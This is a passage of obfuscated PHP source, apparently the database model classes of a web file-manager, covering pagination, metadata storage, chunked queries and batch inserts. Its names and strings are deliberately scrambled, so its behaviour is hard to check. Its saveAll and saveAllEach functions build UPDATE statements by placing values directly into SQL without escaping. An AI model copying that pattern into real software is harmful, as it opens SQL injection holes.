get_class($this) . $ÕÎÏƒ…Î[11] . $§£ôàÊÙ . $ÕÎÏƒ…Î[405] . $ŞïË½òì; } protected function selectPageReset() { $ïøñµ¨® =& $_SERVER[—ÌÒğš÷]; if (isset($GLOBALS[$ïøñµ¨®[406]])) { return; } $GLOBALS[$ïøñµ¨®[406]] = isset($GLOBALS[$ïøñµ¨®[7]][$ïøñµ¨®[407]]) ? $GLOBALS[$ïøñµ¨®[7]][$ïøñµ¨®[407]] : !1; $GLOBALS[$ïøñµ¨®[408]] = isset($GLOBALS[$ïøñµ¨®[7]][$ïøñµ¨®[397]]) ? $GLOBALS[$ïøñµ¨®[7]][$ïøñµ¨®[397]] : !1; $GLOBALS[$ïøñµ¨®[7]][$ïøñµ¨®[407]] = !1; $GLOBALS[$ïøñµ¨®[7]][$ïøñµ¨®[397]] = !1; } protected function selectPageRestore() { $µŠ‚¶½  =& $_SERVER[—ÌÒğš÷]; if (!isset($GLOBALS[$µŠ‚¶½ [406]])) { return; } $GLOBALS[$µŠ‚¶½ [7]][$µŠ‚¶½ [407]] = $GLOBALS[$µŠ‚¶½ [406]]; $GLOBALS[$µŠ‚¶½ [7]][$µŠ‚¶½ [397]] = $GLOBALS[$µŠ‚¶½ [408]]; if ($GLOBALS[$µŠ‚¶½ [7]][$µŠ‚¶½ [407]] === !1) { unset($GLOBALS[$µŠ‚¶½ [7]][$µŠ‚¶½ [407]]); } if ($GLOBALS[$µŠ‚¶½ [7]][$µŠ‚¶½ [397]] === !1) { unset($GLOBALS[$µŠ‚¶½ [7]][$µŠ‚¶½ [397]]); } unset($GLOBALS[$µŠ‚¶½ [406]]); unset($GLOBALS[$µŠ‚¶½ [408]]); } protected function selectPage($ Œ¾“ø¾ = 200, $ÆÅÕ×ü© = 1) { $¸ÕÔù«½ =& $_SERVER[—ÌÒğš÷]; global $in; $„Ç“Ÿã× = $this->optionsValue(); $â“Á¨¨÷ = 50000; $ Œ¾“ø¾ = isset($in[$¸ÕÔù«½[407]]) && $in[$¸ÕÔù«½[407]] ? $in[$¸ÕÔù«½[407]] : $ Œ¾“ø¾; if ($ Œ¾“ø¾ === -1) { $in[$¸ÕÔù«½[407]] = !1; $â“Á¨¨÷ = 100000000; $ Œ¾“ø¾ = $â“Á¨¨÷; } $ŞìôäÜ = $„Ç“Ÿã×; $ŞìôäÜ[$¸ÕÔù«½[409]] = array(); $ Œ¾“ø¾ = intval($ Œ¾“ø¾); $ Œ¾“ø¾ = $ Œ¾“ø¾ <= 5 ? 5 : ($ Œ¾“ø¾ >= $â“Á¨¨÷ ? $â“Á¨¨÷ : $ Œ¾“ø¾); $ÆÅÕ×ü© = intval(isset($in[$¸ÕÔù«½[397]]) && $in[$¸ÕÔù«½[397]] ? $in[$¸ÕÔù«½[397]] : $ÆÅÕ×ü©); $ÆÅÕ×ü© = $ÆÅÕ×ü© <= 1 ? 1 : $ÆÅÕ×ü©; $†¿şáå¿ = array(); $ƒ¼»û¹– = 1; if ($ÆÅÕ×ü© == 1 && $ƒ¼»û¹–) { $this->optionsValue($„Ç“Ÿã×); $†¿şáå¿ = $this->page($ÆÅÕ×ü©, $ Œ¾“ø¾)->select(); $² ”“ª = is_array($†¿şáå¿) ? count($†¿şáå¿) : 0; if ($² ”“ª < $ Œ¾“ø¾) { $ŞÏá‘Ì“ = 1; } else { $this->optionsValue($ŞìôäÜ); $² ”“ª = intval($this->count()); $ŞÏá‘Ì“ = ceil($² ”“ª / $ Œ¾“ø¾); } } else { $this->optionsValue($ŞìôäÜ); $² ”“ª = intval($this->count()); $ŞÏá‘Ì“ = ceil($² ”“ª / $ Œ¾“ø¾); $ÆÅÕ×ü© = $ÆÅÕ×ü© >= $ŞÏá‘Ì“ ? $ŞÏá‘Ì“ : $ÆÅÕ×ü©; $this->optionsValue($„Ç“Ÿã×); $†¿şáå¿ = $this->page($ÆÅÕ×ü©, $ Œ¾“ø¾)->select(); } if (!is_array($†¿şáå¿)) { $†¿şáå¿ = array(); } if ($ŞÏá‘Ì“ == 1) { $² ”“ª = count($†¿şáå¿); } $ÜÛ¬Ûò = array($¸ÕÔù«½[410] => array($¸ÕÔù«½[411] => $² ”“ª, $¸ÕÔù«½[407] => $ Œ¾“ø¾, $¸ÕÔù«½[397] => $ÆÅÕ×ü©, $¸ÕÔù«½[412] => $ŞÏá‘Ì“), $¸ÕÔù«½[413] => $†¿şáå¿); return $ÜÛ¬Ûò; } protected function checkLength($Ù–„ãæ”, $ˆÃ½Îè = 0, $âšÓşª¨ = '') { $Ã¡á†ù¯ =& $_SERVER[—ÌÒğš÷]; $ˆÃ½Îè = $ˆÃ½Îè ? $ˆÃ½Îè : 65536; if (!$Ù–„ãæ” || strlen($Ù–„ãæ”) < $ˆÃ½Îè) { return; } $âšÓşª¨ = $âšÓşª¨ ? $âšÓşª¨ . $Ã¡á†ù¯[71] : $Ã¡á†ù¯[12]; show_json($âšÓşª¨ . LNG($Ã¡á†ù¯[414]) . "\50{$ˆÃ½Îè}\51", !1); } protected function metaSet($ÜÛÈ–Ò’, $Îò¶Ö›î = null, $‹„ıÔë´ = null) { $©–·µ‡œ =& $_SERVER[—ÌÒğš÷]; if (!$this->tableMeta || !$ÜÛÈ–Ò’) { return !1; } $ «ƒÕ = $this->tableMeta[$©–·µ‡œ[415]]; $Öáê˜‡Í = $this->tableMeta[$©–·µ‡œ[416]]; $Ë¤öŞØº = Model($Öáê˜‡Í); $Ôû÷Ñ = array($ «ƒÕ => $ÜÛÈ–Ò’, $©–·µ‡œ[417] => $Îò¶Ö›î); if (is_null($Îò¶Ö›î)) { return $Ë¤öŞØº->where(array($ «ƒÕ => $ÜÛÈ–Ò’))->delete(); } if (is_null($‹„ıÔë´) && is_string($Îò¶Ö›î)) { return $Ë¤öŞØº->where($Ôû÷Ñ)->delete(); } $Ôˆ…Ôê— = is_array($Îò¶Ö›î) ? $Îò¶Ö›î : array(); if (is_string($Îò¶Ö›î)) { $Ôˆ…Ôê—[$Îò¶Ö›î] = $‹„ıÔë´; } $ß¶­œ»¯ = array(); foreach ($Ôˆ…Ôê— as $¾ö ¿£õ => $²ÔûïÑ†) { if (is_null($²ÔûïÑ†) && is_string($¾ö ¿£õ)) { $Ë¤öŞØº->where(array($ «ƒÕ => $ÜÛÈ–Ò’, $©–·µ‡œ[417] => $¾ö ¿£õ))->delete(); continue; } $this->checkLength($²ÔûïÑ†, !1, $Öáê˜‡Í . $©–·µ‡œ[4] . $¾ö ¿£õ); $ß¶­œ»¯[] = array($ «ƒÕ => $ÜÛÈ–Ò’, $©–·µ‡œ[94] => $¾ö ¿£õ, $©–·µ‡œ[418] => $²ÔûïÑ†); } $“¬›“©ò = $©–·µ‡œ[419] . $Öáê˜‡Í; CacheLock::lock($“¬›“©ò); $Ë¤öŞØº->where(array($ «ƒÕ => $ÜÛÈ–Ò’))->addAll($ß¶­œ»¯, array(), !0); CacheLock::unlock($“¬›“©ò); return !0; } public function metaGet($ÇŸ§´«‡, $¯ùîäÉ = false) { $ˆ×Óî×µ =& $_SERVER[—ÌÒğš÷]; if (!$this->tableMeta) { return array(); } $ÌÅÏ¦£ö = $this->tableMeta[$ˆ×Óî×µ[415]]; $¸ùäÛ½‹ = Model($this->tableMeta[$ˆ×Óî×µ[416]]); if ($¯ùîäÉ) { $ñéİÍıÆ = array($ÌÅÏ¦£ö => $ÇŸ§´«‡, $ˆ×Óî×µ[94] => $¯ùîäÉ); return $¸ùäÛ½‹->where($ñéİÍıÆ)->getField($ˆ×Óî×µ[418]); } $ñéİÍıÆ = array($ÌÅÏ¦£ö => $ÇŸ§´«‡); $¾¡é‹ä = $¸ùäÛ½‹->field($ˆ×Óî×µ[420])->where($ñéİÍıÆ)->select(); $¾¡é‹ä = array_to_keyvalue($¾¡é‹ä, $ˆ×Óî×µ[94], $ˆ×Óî×µ[418]); return $¾¡é‹ä; } private function checkDataAutoHas($¡‡˜Ù·) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $‡ÌÅ»’) { if (in_array($¡‡˜Ù·, explode($_SERVER[—ÌÒğš÷][50], $‡ÌÅ»’[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¨îá×âê, $½öÇ¦»¯) { $÷¡ÜÔÈ =& $_SERVER[—ÌÒğš÷]; if (!is_array($¨îá×âê)) { return; } foreach ($this->dataAuto as $ßÂ¥ Şà) { $‘¿ÚÂ‡Õ = $ßÂ¥ Şà[0]; if (!in_array($½öÇ¦»¯, explode($÷¡ÜÔÈ[50], $ßÂ¥ Şà[2]))) { continue; } switch (trim($ßÂ¥ Şà[3])) { case $÷¡ÜÔÈ[365]: case $÷¡ÜÔÈ[366]: $Äóˆá”“ = $ßÂ¥ Şà[1]; $÷ıú›ô = isset($ßÂ¥ Şà[4]) ? (array) $ßÂ¥ Şà[4] : array(); if ($Äóˆá”“ == $÷¡ÜÔÈ[194] && array_key_exists($‘¿ÚÂ‡Õ, $¨îá×âê)) { if (!$¨îá×âê[$‘¿ÚÂ‡Õ]) { unset($¨îá×âê[$‘¿ÚÂ‡Õ]); } break; } if (isset($¨îá×âê[$‘¿ÚÂ‡Õ])) { array_unshift($÷ıú›ô, $¨îá×âê[$‘¿ÚÂ‡Õ]); } if ($÷¡ÜÔÈ[365] == $ßÂ¥ Şà[3]) { $¨îá×âê[$‘¿ÚÂ‡Õ] = call_user_func_array($Äóˆá”“, $÷ıú›ô); } else { $¨îá×âê[$‘¿ÚÂ‡Õ] = call_user_func_array(array(&$this, $Äóˆá”“), $÷ıú›ô); } break; case $÷¡ÜÔÈ[314]: if (isset($¨îá×âê[$‘¿ÚÂ‡Õ]) && $¨îá×âê[$‘¿ÚÂ‡Õ]) { $¨îá×âê[$‘¿ÚÂ‡Õ] = call_user_func_array(array(&$this, $ßÂ¥ Şà[1]), array($¨îá×âê[$‘¿ÚÂ‡Õ])); } break; case $÷¡ÜÔÈ[317]: $¨îá×âê[$‘¿ÚÂ‡Õ] = $¨îá×âê[$ßÂ¥ Şà[1]]; break; case $÷¡ÜÔÈ[338]: if (isset($¨îá×âê[$‘¿ÚÂ‡Õ]) && !is_string($¨îá×âê[$‘¿ÚÂ‡Õ])) { $¨îá×âê[$‘¿ÚÂ‡Õ] = json_encode_force($¨îá×âê[$‘¿ÚÂ‡Õ]); } break; case $÷¡ÜÔÈ[367]: if ($¨îá×âê[$‘¿ÚÂ‡Õ] === $÷¡ÜÔÈ[12]) { unset($¨îá×âê[$‘¿ÚÂ‡Õ]); } break; case $÷¡ÜÔÈ[368]: $¨îá×âê[$‘¿ÚÂ‡Õ] = $ßÂ¥ Şà[1]; default: break; } } if ($½öÇ¦»¯ == $÷¡ÜÔÈ[399]) { $Êø©üı = strtolower($this->db->getDbType()); if (strpos($Êø©üı, $÷¡ÜÔÈ[13]) !== 0) { return; } $ÛÏƒ¢È = $this->field(!0)->fields; $¥ú²÷Èƒ = $ÛÏƒ¢È[$÷¡ÜÔÈ[296]]; if (isset($ÛÏƒ¢È[$÷¡ÜÔÈ[295]])) { unset($¥ú²÷Èƒ[$ÛÏƒ¢È[$÷¡ÜÔÈ[295]]]); } foreach ($¥ú²÷Èƒ as $Åë¨…¤ü => $½öÇ¦»¯) { if (!isset($¨îá×âê[$Åë¨…¤ü])) { $¨îá×âê[$Åë¨…¤ü] = $÷¡ÜÔÈ[12]; } } } } private function dataAfterFilter(&$ÑÌØ‹ì) { $±ğìØ­ =& $_SERVER[—ÌÒğš÷]; foreach ($this->dataAuto as $ ²„®¿) { $áéÇèÎ = $ ²„®¿[0]; if (!isset($ÑÌØ‹ì[$áéÇèÎ])) { continue; } if (!in_array($±ğìØ­[401], explode($±ğìØ­[50], $ ²„®¿[2]))) { continue; } switch (trim($ ²„®¿[3])) { case $±ğìØ­[365]: case $±ğìØ­[366]: $´Ú·”…ó = isset($ ²„®¿[4]) ? (array) $ ²„®¿[4] : array(); array_unshift($´Ú·”…ó, $ÑÌØ‹ì[$áéÇèÎ]); if (isset($ ²„®¿[4]) && $ ²„®¿[4] == $±ğìØ­[421]) { $´Ú·”…ó = array($ÑÌØ‹ì[$áéÇèÎ]); } if ($±ğìØ­[365] == $ ²„®¿[3]) { $ÑÌØ‹ì[$áéÇèÎ] = call_user_func_array($ ²„®¿[1], $´Ú·”…ó); } else { $ÑÌØ‹ì[$áéÇèÎ] = call_user_func_array(array(&$this, $ ²„®¿[1]), $´Ú·”…ó); } break; case $±ğìØ­[314]: if (isset($ÑÌØ‹ì[$áéÇèÎ]) && $ÑÌØ‹ì[$áéÇèÎ]) { $ÑÌØ‹ì[$áéÇèÎ] = call_user_func_array(array(&$this, $ ²„®¿[1]), array($ÑÌØ‹ì[$áéÇèÎ])); } break; case $±ğìØ­[317]: $ÑÌØ‹ì[$áéÇèÎ] = $ÑÌØ‹ì[$ ²„®¿[1]]; break; case $±ğìØ­[338]: $¦ºƒÕ’ = $ÑÌØ‹ì[$áéÇèÎ]; $ÑÌØ‹ì[$áéÇèÎ] = json_decode($¦ºƒÕ’, !0); if (is_null($ÑÌØ‹ì[$áéÇèÎ])) { $ÑÌØ‹ì[$áéÇèÎ] = $¦ºƒÕ’; } break; case $±ğìØ­[367]: if ($ÑÌØ‹ì[$áéÇèÎ] === $±ğìØ­[12]) { unset($ÑÌØ‹ì[$áéÇèÎ]); } break; case $±ğìØ­[368]: $ÑÌØ‹ì[$áéÇèÎ] = $ ²„®¿[1]; break; default: break; } } } public function saveAll($’ğÃ„ÙŞ) { $õ¤øë¤Ø =& $_SERVER[—ÌÒğš÷]; $“ñú–Ì¸ = $this->tablePrefix . $this->tableName; $¸ÀÀ€Ğ = self::SQL_WHERE_IN_CHUNK; $’ğÃ„ÙŞ = is_array($’ğÃ„ÙŞ) ? $’ğÃ„ÙŞ : array(); $ ï­ãÇ† = $õ¤øë¤Ø[422]; $¯èÛ±ƒ½ = 0; $É‡¾°€ = array(); $¥©ëë²¼ = count($’ğÃ„ÙŞ); for ($ğõ‚ã·à = 0; $ğõ‚ã·à < $¥©ëë²¼; $ğõ‚ã·à++) { $¤éÇÄœÏ = $’ğÃ„ÙŞ[$ğõ‚ã·à]; if (!is_array($¤éÇÄœÏ) || count($¤éÇÄœÏ) != 4) { continue; } $™–ĞÁÕ = "\125\x50\104\x41\124\x45\x20\x60{$“ñú–Ì¸}\140\x20\x53\x45\x54\x20{$¤éÇÄœÏ[2]}\40\x3d\x20\x43\x41\x53\105\40{$¤éÇÄœÏ[0]}\x20\xa"; if ($¯èÛ±ƒ½ == 0) { $ ï­ãÇ† = $™–ĞÁÕ; } $É‡¾°€[] = $õ¤øë¤Ø[118] . $¤éÇÄœÏ[1] . $õ¤øë¤Ø[118]; $¯èÛ±ƒ½++; $ ï­ãÇ† .= "\x20\127\110\105\116\x20\47{$¤éÇÄœÏ[1]}\47\40\x54\110\x45\x4e\x20\x27{$¤éÇÄœÏ[3]}\x27\x20\12"; if ($¯èÛ±ƒ½ == $¸ÀÀ€Ğ || $ğõ‚ã·à == $¥©ëë²¼ - 1) { $Ó´Õ³£ = implode($õ¤øë¤Ø[50], $É‡¾°€); $ ï­ãÇ† .= "\40\105\116\x44\40\40\127\110\x45\122\105\40{$¤éÇÄœÏ[0]}\40\111\x4e\x20\50{$Ó´Õ³£}\x29\40"; $this->execute($ ï­ãÇ†); $¯èÛ±ƒ½ = 0; $ ï­ãÇ† = $™–ĞÁÕ; $this->chunkEventCheck(count($É‡¾°€)); $É‡¾°€ = array(); } } $this->chunkEventSet(); } public function saveAllEach($°ôª¿Ş) { $Ú¯‘—™ =& $_SERVER[—ÌÒğš÷]; $óñ÷ïÀ = $this->tablePrefix . $this->tableName; foreach ($°ôª¿Ş as $¦²¯ÍÉƒ) { if (!is_array($¦²¯ÍÉƒ) || count($¦²¯ÍÉƒ) != 4) { continue; } $¢©ÆšÄ = $¦²¯ÍÉƒ[0] . $Ú¯‘—™[423] . $¦²¯ÍÉƒ[1] . $Ú¯‘—™[118]; $ªèö˜ÙÆ = $¦²¯ÍÉƒ[2] . $Ú¯‘—™[423] . $¦²¯ÍÉƒ[3] . $Ú¯‘—™[118]; $Í½åŞŞë = "\165\x70\x64\x61\x74\145\x20{$óñ÷ïÀ}\x20\x73\145\164\x20{$ªèö˜ÙÆ}\x20\x77\x68\145\x72\145\x20{$¢©ÆšÄ}\73"; $this->execute($Í½åŞŞë); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($“Áà”º = false, $»—İ¬„š = false) { $this->_chunkEvent = $“Áà”º; $this->_chunkEventParam = $»—İ¬„š; } private function chunkEventCheck($ÔßÇ—æÄ) { if (!$this->_chunkEvent) { return; } $Ùê²ş· = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ùê²ş·[$_SERVER[—ÌÒğš÷][424]] = $ÔßÇ—æÄ; Hook::trigger($this->_chunkEvent, $Ùê²ş·); } public function addAll($şı²ÒšÂ, $¤˜ÛÔŒÖ = array(), $¯¾Ô–‹Ò = false) { $™šõ¤à =& $_SERVER[—ÌÒğš÷]; ignore_timeout(); $‚¸Ûø¸¬ = self::SQL_WHERE_IN_CHUNK; if (empty($şı²ÒšÂ)) { $this->error = think_lang($™šõ¤à[315]); return !1; } $¤˜ÛÔŒÖ = $this->_parseOptions($¤˜ÛÔŒÖ); foreach ($şı²ÒšÂ as $´ÓÚ¼’³ => $ƒ´Š¸å‚) { $şı²ÒšÂ[$´ÓÚ¼’³] = $this->_facade($ƒ´Š¸å‚); $this->_beforeInsert($şı²ÒšÂ[$´ÓÚ¼’³], $¤˜ÛÔŒÖ); } if (method_exists($this->db, $™šõ¤à[316])) { for ($çË€Ù§ı = 0; $çË€Ù§ı < count($şı²ÒšÂ); $çË€Ù§ı += $‚¸Ûø¸¬) { $ÚĞ¼İÛ´ = array_slice($şı²ÒšÂ, $çË€Ù§ı, $‚¸Ûø¸¬); if (!is_array($ÚĞ¼İÛ´) || count($ÚĞ¼İÛ´) == 0) { break; } $®âœ¡ñ = $this->db->insertAll($ÚĞ¼İÛ´, $¤˜ÛÔŒÖ, $¯¾Ô–‹Ò); $this->chunkEventCheck(count($ÚĞ¼İÛ´)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($şı²ÒšÂ as $´ÓÚ¼’³ => $ƒ´Š¸å‚) { $®âœ¡ñ = $this->db->insert($ƒ´Š¸å‚, $¤˜ÛÔŒÖ, $¯¾Ô–‹Ò); } $this->commit(); } if (!1 !== $®âœ¡ñ) { $˜«íÇ»× = $this->getLastInsID(); if ($˜«íÇ»×) { return $˜«íÇ»×; } } return $®âœ¡ñ; } public function save($‡ÑïàóÈ = '', $¹Á£€şŸ = array()) { $£ò°Çş… =& $_SERVER[—ÌÒğš÷]; $öü¯ˆİ± = self::SQL_WHERE_IN_CHUNK; $ßâç­Áƒ = $this->optionsValue(); $ùù°ÍË = $this->findWhereField($ßâç­Áƒ); if (!$ùù°ÍË) { return parent::save($‡ÑïàóÈ, $¹Á£€şŸ); } $Û¾êŸ’´ = 0; $í´†Ÿ‚Á = $ßâç­Áƒ[$£ò°Çş…[319]][$ùù°ÍË][1]; $í´†Ÿ‚Á = is_array($í´†Ÿ‚Á) ? $í´†Ÿ‚Á : array(); $§’ß÷‰» = count($í´†Ÿ‚Á); for ($ìÎŒ½ = 0; $ìÎŒ½ < $§’ß÷‰»; $ìÎŒ½ += $öü¯ˆİ±) { $…ªÎÌú– = array_slice($í´†Ÿ‚Á, $ìÎŒ½, $öü¯ˆİ±); if (!is_array($…ªÎÌú–) || count($…ªÎÌú–) == 0) { break; } $ßâç­Áƒ[$£ò°Çş…[319]][$ùù°ÍË][1] = $…ªÎÌú–; $this->optionsValue($ßâç­Áƒ); $Û¾êŸ’´ += parent::save($‡ÑïàóÈ, $¹Á£€şŸ); $this->chunkEventCheck(count($…ªÎÌú–)); } $this->chunkEventSet(); return $Û¾êŸ’´; } public function add($ÇøËŞØ = '', $øğ´Ê‰Ñ = array(), $ªíñ“±ï = false) { if ($this->addTaskStatus && is_array($ÇøËŞØ)) { $this->addTaskData[] = $ÇøËŞØ; return; } return parent::add($ÇøËŞØ, $øğ´Ê‰Ñ, $ªíñ“±ï); } public function parseWhereLike($éí•¶¶É, $­•şêÚ´ = '', $¡ˆà¾èÎ = false, &$Öí–¨µ‹ = false) { $·½»×ô  =& $_SERVER[—ÌÒğš÷]; $ñ²¢¨‘ = $GLOBALS[$·½»×ô [6]][$·½»×ô [425]]; if (!$ñ²¢¨‘[$·½»×ô [426]]) { return $éí•¶¶É; } if (!is_array($éí•¶¶É)) { return $éí•¶¶É; } $±±¯ïÌ« = array(); $¦”°¦µÌ = 0; foreach ($éí•¶¶É as $òğŠ­â => $“¯‹¼¯Á) { if (is_array($“¯‹¼¯Á) && count($“¯‹¼¯Á) == 2 && $“¯‹¼¯Á[0] == $·½»×ô [427] && is_string($“¯‹¼¯Á[1]) && substr($“¯‹¼¯Á[1], 0, 1) == $·½»×ô [428] && substr($“¯‹¼¯Á[1], strlen($“¯‹¼¯Á[1]) - 1, 1) == $·½»×ô [428]) { $Öí–¨µ‹ = !0; $¼æ€ı¹‘ = is_string($òğŠ­â) ? $òğŠ­â : $­•şêÚ´; $İ´¨ş»Ñ = substr($“¯‹¼¯Á[1], 1, strlen($“¯‹¼¯Á[1]) - 2); $İ´¨ş»Ñ = $this->db->escapeString($İ´¨ş»Ñ); if (!strpos($¼æ€ı¹‘, $·½»×ô [10])) { $¼æ€ı¹‘ = $·½»×ô [429] . $¼æ€ı¹‘ . $·½»×ô [429]; } $‚·ÓÊ»‚ = $·½»×ô [203] . $İ´¨ş»Ñ . $·½»×ô [203]; $İ´¨ş»Ñ = str_replace(array($·½»×ô [10], $·½»×ô [430], $·½»×ô [11]), $·½»×ô [431], $İ´¨ş»Ñ); if ($ñ²¢¨‘[$·½»×ô [432]]) { $‚·ÓÊ»‚ = $·½»×ô [433] . $İ´¨ş»Ñ . $·½»×ô [434]; if ($ñ²¢¨‘[$·½»×ô [435]]) { $‚·ÓÊ»‚ = $·½»×ô [434] . $İ´¨ş»Ñ . $·½»×ô [433]; } } $±±¯ïÌ«[$¦”°¦µÌ] = $·½»×ô [436] . $¼æ€ı¹‘ . $·½»×ô [437] . $‚·ÓÊ»‚ . $·½»×ô [438]; $¦”°¦µÌ++; continue; } if (is_array($“¯‹¼¯Á)) { $­•şêÚ´ = is_string($òğŠ­â) ? $òğŠ­â : $­•şêÚ´; $“¯‹¼¯Á = $this->parseWhereLike($“¯‹¼¯Á, $­•şêÚ´, !0, $Öí–¨µ‹); } if (is_numeric($òğŠ­â)) { $±±¯ïÌ«[$¦”°¦µÌ] = $“¯‹¼¯Á; $¦”°¦µÌ++; } else { $±±¯ïÌ«[$òğŠ­â] = $“¯‹¼¯Á; } } if ($Öí–¨µ‹ && !$¡ˆà¾èÎ) { } return $±±¯ïÌ«; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($­©Š‘œğ = array()) { $³Ê¸îÚ© =& $_SERVER[—ÌÒğš÷]; $æÅ›Ã– = self::SQL_WHERE_IN_CHUNK; $†Ë²ı = $this->optionsValue(); $Ç€ú½Ø = $this->findWhereField($†Ë²ı); if (!$Ç€ú½Ø || isset($†Ë²ı[$³Ê¸îÚ©[336]]) || isset($†Ë²ı[$³Ê¸îÚ©[397]])) { return parent::select($­©Š‘œğ); } $“Ó¦¯ù = $†Ë²ı[$³Ê¸îÚ©[319]][$Ç€ú½Ø][1]; $“Ó¦¯ù = is_array($“Ó¦¯ù) ? $“Ó¦¯ù : array(); $ş½ç¡€‡ = null; for ($´ˆëˆ©ê = 0; $´ˆëˆ©ê < count($“Ó¦¯ù); $´ˆëˆ©ê += $æÅ›Ã–) { $„±¿îÊõ = array_slice($“Ó¦¯ù, $´ˆëˆ©ê, $æÅ›Ã–); if (!is_array($„±¿îÊõ) || count($„±¿îÊõ) == 0) { break; } $†Ë²ı[$³Ê¸îÚ©[319]][$Ç€ú½Ø][1] = $„±¿îÊõ; $this->optionsValue($†Ë²ı); $ÜéûÅº = parent::select($­©Š‘œğ); if (!$ÜéûÅº) { continue; } $ş½ç¡€‡ = is_array($ş½ç¡€‡) ? $ş½ç¡€‡ : array(); $ş½ç¡€‡ = array_merge($ş½ç¡€‡, $ÜéûÅº); } return $ş½ç¡€‡; } public function delete($í­’ÁÑ± = array()) { $¢Éº‰Šã =& $_SERVER[—ÌÒğš÷]; $Öá Œ½ = self::SQL_WHERE_IN_CHUNK; $Ë¦´ùÏø = $this->optionsValue(); $ˆÒ‰™š¹ = $this->findWhereField($Ë¦´ùÏø); if (!$ˆÒ‰™š¹) { return parent::delete($í­’ÁÑ±); } $Ó–Éèù° = 0; $ÚØäí™ = $Ë¦´ùÏø[$¢Éº‰Šã[319]][$ˆÒ‰™š¹][1]; $ÚØäí™ = is_array($ÚØäí™) ? $ÚØäí™ : array(); for ($ºò–Ò¨ã = 0; $ºò–Ò¨ã < count($ÚØäí™); $ºò–Ò¨ã += $Öá Œ½) { $óï²––ú = array_slice($ÚØäí™, $ºò–Ò¨ã, $Öá Œ½); if (!is_array($óï²––ú) || count($óï²––ú) == 0) { break; } $Ë¦´ùÏø[$¢Éº‰Šã[319]][$ˆÒ‰™š¹][1] = $óï²––ú; $this->optionsValue($Ë¦´ùÏø); $Ó–Éèù° += parent::delete($í­’ÁÑ±); } return $Ó–Éèù°; } private function findWhereField($…¹’Áô) { $©ãÄŞøş =& $_SERVER[—ÌÒğš÷]; $×Î×·¬¨ = self::SQL_WHERE_IN_CHUNK; if (!is_array($…¹’Áô) || !is_array($…¹’Áô[$©ãÄŞøş[319]])) { return !1; } foreach ($…¹’Áô[$©ãÄŞøş[319]] as $…¸†è => $½üß§÷¦) { if (is_array($½üß§÷¦) && isset($½üß§÷¦[0]) && is_string($½üß§÷¦[0]) && strtolower($½üß§÷¦[0]) == $©ãÄŞøş[7] && is_array($½üß§÷¦[1]) && count($½üß§÷¦[1]) > $×Î×·¬¨) { ignore_timeout(); return $…¸†è; } } return !1; } public function setMasterDB($®Ò¡Œ„ = true) { think_config($_SERVER[—ÌÒğš÷][439], $®Ò¡Œ„); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\x73\x74\x65\155\x4f\160\164\151\157\156"; public $field = array(); public function listData($¬ùÊÎÉ = false, $æú—¿ßÂ = "\x6d\157\x64\x69\146\x79\124\x69\155\145", $ÜÌÚ³½– = false) { $£ÕŠ‡• = Model($this->modelType)->get(!1, $this->optionType, !0); $®çøÒÅ = array_values($£ÕŠ‡•); if ($®çøÒÅ && $®çøÒÅ[0] && !is_array($®çøÒÅ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $£ÕŠ‡• = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$£ÕŠ‡•) { return $¬ùÊÎÉ ? null : array(); } if (!$¬ùÊÎÉ) { $£ÕŠ‡• = array_filter(array_values($£ÕŠ‡•)); return array_sort_by($£ÕŠ‡•, $æú—¿ßÂ, $ÜÌÚ³½–); } return $£ÕŠ‡•[$_SERVER[—ÌÒğš÷][440] . $¬ùÊÎÉ]; } public function insert($çÌ‹Õƒ) { $Œñøœ–¢ =& $_SERVER[—ÌÒğš÷]; $çÌ‹Õƒ = array_field_key($çÌ‹Õƒ, $this->field); $™¼œ€Á = Model($this->modelType)->get($Œñøœ–¢[441], $this->optionType . $Œñøœ–¢[442]); $™¼œ€Á = $™¼œ€Á ? $™¼œ€Á : 0; $çÌ‹Õƒ[$Œñøœ–¢[443]] = ++$™¼œ€Á; $çÌ‹Õƒ[$Œñøœ–¢[215]] = time(); $çÌ‹Õƒ[$Œñøœ–¢[85]] = time(); Model($this->modelType)->set($Œñøœ–¢[441], $™¼œ€Á, $this->optionType . $Œñøœ–¢[442]); Model($this->modelType)->set($Œñøœ–¢[440] . $™¼œ€Á, $çÌ‹Õƒ, $this->optionType); return $™¼œ€Á; } public function update($ßãµª‰ı, $õÂœîÚ) { $ØŸ¤ØŠÙ =& $_SERVER[—ÌÒğš÷]; $õÂœîÚ = array_field_key($õÂœîÚ, $this->field); $ú°İßğ = $this->listData($ßãµª‰ı); if (!$ú°İßğ || !$ßãµª‰ı) { return !1; } $õÂœîÚ = array_merge($ú°İßğ, $õÂœîÚ); $õÂœîÚ[$ØŸ¤ØŠÙ[85]] = time(); return Model($this->modelType)->set($ØŸ¤ØŠÙ[440] . $ßãµª‰ı, $õÂœîÚ, $this->optionType); } public function remove($ş›ÛóÜ) { if (!$ş›ÛóÜ) { return !1; } return Model($this->modelType)->remove($_SERVER[—ÌÒğš÷][440] . $ş›ÛóÜ, $this->optionType); } public function clear() { $ÄšÈ—’ =& $_SERVER[—ÌÒğš÷]; Model($this->modelType)->remove($ÄšÈ—’[441], $this->optionType . $ÄšÈ—’[442]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ú§ªú¡ô, $’õßİó) { if (!$’õßİó) { return !1; } $Ï¡³€œ = $this->listData(); $Ï¡³€œ = array_to_keyvalue($Ï¡³€œ, $ú§ªú¡ô); return isset($Ï¡³€œ[$’õßİó]) ? $Ï¡³€œ[$’õßİó] : !1; } public function findByName($ëÊüú×Ï) { return $this->findByKey($_SERVER[—ÌÒğš÷][32], $ëÊüú×Ï); } protected function resetData($„òÛ¢É§) { $õ¦õŒÜ =& $_SERVER[—ÌÒğš÷]; $„òÛ¢É§ = is_array($„òÛ¢É§) ? $„òÛ¢É§ 